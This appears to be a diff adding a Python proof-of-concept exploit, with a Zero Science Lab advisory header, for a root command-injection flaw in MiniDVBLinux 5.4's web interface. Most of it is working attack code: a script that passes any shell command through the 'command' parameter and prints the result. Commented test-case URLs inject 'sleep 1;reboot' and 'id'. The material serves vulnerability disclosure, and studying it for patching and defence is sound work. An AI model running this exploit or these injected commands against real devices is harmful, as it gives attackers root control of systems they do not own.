@@ -1,0 +1,63 @@
+#!/usr/bin/env python3
+#
+#
+# MiniDVBLinux 5.4 Remote Root Command Execution Vulnerability
+#
+#
+# Vendor: MiniDVBLinux
+# Product web page: https://www.minidvblinux.de
+# Affected version: <=5.4
+#
+# Summary: MiniDVBLinux(TM) Distribution (MLD). MLD offers a simple
+# way to convert a standard PC into a Multi Media Centre based on the
+# Video Disk Recorder (VDR) by Klaus Schmidinger. Features of this
+# Linux based Digital Video Recorder: Watch TV, Timer controlled
+# recordings, Time Shift, DVD and MP3 Replay, Setup and configuration
+# via browser, and a lot more. MLD strives to be as small as possible,
+# modular, simple. It supports numerous hardware platforms, like classic
+# desktops in 32/64bit and also various low power ARM systems.
+#
+# Desc: The application suffers from an OS command execution vulnerability.
+# This can be exploited to execute arbitrary commands as root, through the
+# 'command' GET parameter in /tpl/commands.sh.
+#
+# Tested on: MiniDVBLinux 5.4
+#            BusyBox v1.25.1
+#            Architecture: armhf, armhf-rpi2
+#            GNU/Linux 4.19.127.203 (armv7l)
+#            VideoDiskRecorder 2.4.6
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2022-5718
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5718.php
+#
+#
+# 24.09.2022
+#
+
+import requests
+import re,sys
+
+#test case 002
+#http://ip:8008/?site=commands&section=system&command=sleep%201;reboot
+#-
+#test case 003
+#http://ip:8008/?site=commands&section=system&command=id
+#uid=0(root) gid=0(root)
+
+if len(sys.argv) < 3:
+  print('MiniDVBLinux 5.4 Command Execution PoC')
+  print('Usage: ./mldhd_root1.py [url] [cmd]')
+  sys.exit(17)
+else:
+    url = sys.argv[1]
+    cmd = sys.argv[2]
+
+req = requests.get(url+'/?site=commands&section=system&command='+cmd)
+req = requests.get(url+'/?site=commands&section=system&command='+cmd)
+outz = re.search('log\'>(.*?)</pre>',req.text,flags=re.S).group()
+print(outz.replace('log\'>','').replace('</pre>',''))
